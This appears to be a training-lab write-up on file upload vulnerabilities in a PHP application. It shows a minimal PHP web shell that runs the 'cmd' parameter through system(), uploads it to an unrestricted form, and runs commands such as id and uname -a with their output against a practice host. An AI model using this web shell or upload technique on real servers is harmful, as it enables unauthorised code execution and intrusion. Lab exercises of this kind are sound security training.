File Upload Vulnerabilities

In this section, we will cover how to use file upload functionalities to gain code execution.

In web applications (especially the ones using the file systems to determine what code should be run), you can get code execution on a server, if you manage to upload a file with the right filename (often depending on the extension). 
In this section, we will see the basics of these types of attacks.

First, since we are working on a PHP application, we will need a PHP web shell. 
A web shell is just a simple script or web application that runs the code or commands provided. 
For example, in PHP, the following code is a really simple web shell:

<?php
  system($_GET["cmd"]);
?>

More complex web shells can perform advanced operations, such as providing database and file system access, or even TCP tunnelling.

The first example is a really basic upload form, with no restriction. 
By using the web shell above, and naming it with a .php extension you should be able to get it upload onto the server.
 Once it's uploaded, you can access the script (with the parameter cmd=uname for example) to get command execution. 

 To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

 You can access this exercise using the following URL: http://ptc-0a36ecfb-5f29d0cd.libcurl.so/. 

 
Common Mistakes:

  *  Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

  Steps:
     1) Visit the given URL: http://ptc-0a36ecfb-5f29d0cd.libcurl.so/. 
     2) First make the .php file with the code:
            <?php
                system($_GET['c']);
            ?>
     3) Browse the file and upload.
     4)  Upload doneYour file can be found here. Click 'here'
        And we'll be redirected to: http://ptc-0a36ecfb-5f29d0cd.libcurl.so/upload/text.php
     5) As we know we add 'c' in code so let's change parameter and get 'id' command as:
        ptc-0a36ecfb-5f29d0cd.libcurl.so/upload/text.php?c=id
        Now we can get id as: uid=33(www-data) gid=33(www-data) groups=33(www-data) 
     4) We can also get ls, ls-l, cat and other commands too.
     5) While we use 'uname' command. we get:
        ptc-0a36ecfb-5f29d0cd.libcurl.so/upload/text.php?c=uname
        ----> Linux 
        And when we use 'uname -a' :
        ptc-0a36ecfb-5f29d0cd.libcurl.so/upload/text.php?c=uname -a
        -----> Linux 3171bd2ec574 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2 (2019-08-28) x86_64 GNU/Linux 

     6) Then, let's use (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
        /usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

        ptc-0a36ecfb-5f29d0cd.libcurl.so/upload/text.php?c=/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

     7)  Bravo!!  Congrats you have finished this exercise! 

            Happy Hacking!! :) 